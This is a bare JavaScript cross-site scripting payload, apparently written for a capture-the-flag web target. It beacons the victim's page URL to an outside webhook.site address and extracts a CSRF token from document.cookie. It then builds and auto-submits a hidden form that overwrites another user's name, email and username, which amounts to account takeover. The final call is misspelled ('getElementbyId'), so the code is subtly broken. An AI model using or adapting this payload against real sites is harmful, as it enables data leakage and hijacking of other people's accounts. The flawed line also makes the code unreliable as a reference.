var image = document.createElement("img")

var name = window.location.href
image.src = "https://webhook.site/647ee77d-c9b6-4fb9-be97-a23d43d93a15/image.png?c=" + name

document.body.appendChild(image);


var f = document.createElement("form")
f.setAttribute("id", "evil")
f.setAttribute("method", "post")
f.setAttribute("action", "")

var nameInput = document.createElement("input")
nameInput.setAttribute("type","text")
nameInput.setAttribute("name", "name")
nameInput.setAttribute("value", "Jobert")

var emailInput = document.createElement("input")
emailInput.setAttribute("type", "email")
emailInput.setAttribute("name", "email")
emailInput.setAttribute("value", "jobert@mydocz.cosmic")

var usernameInput = document.createElement("input")
usernameInput.setAttribute("type", "text")
usernameInput.setAttribute("name", "username")
usernameInput.setAttribute("value", "jobert")

var cookie = document.cookie
var csrf = cookie.split("=")[1]

var userIdInput = document.createElement("input")
userIdInput.setAttribute("type", "hidden")
userIdInput.setAttribute("name", "user_id")
userIdInput.setAttribute("value", "2")

var csrfInput = document.createElement("input")
csrfInput.setAttribute("type", "hidden")
csrfInput.setAttribute("name", "_csrf_token")
csrfInput.setAttribute("value", csrf)

var submit = document.createElement("input")
submit.setAttribute("type", "submit")
submit.setAttribute("value", "Save user")


document.body.appendChild(f)
var form = document.getElementById("evil")
form.appendChild(nameInput)
form.appendChild(emailInput)
form.appendChild(usernameInput)
form.appendChild(userIdInput)
form.appendChild(csrfInput)
form.appendChild(submit)

document.getElementbyId('evil').submit()



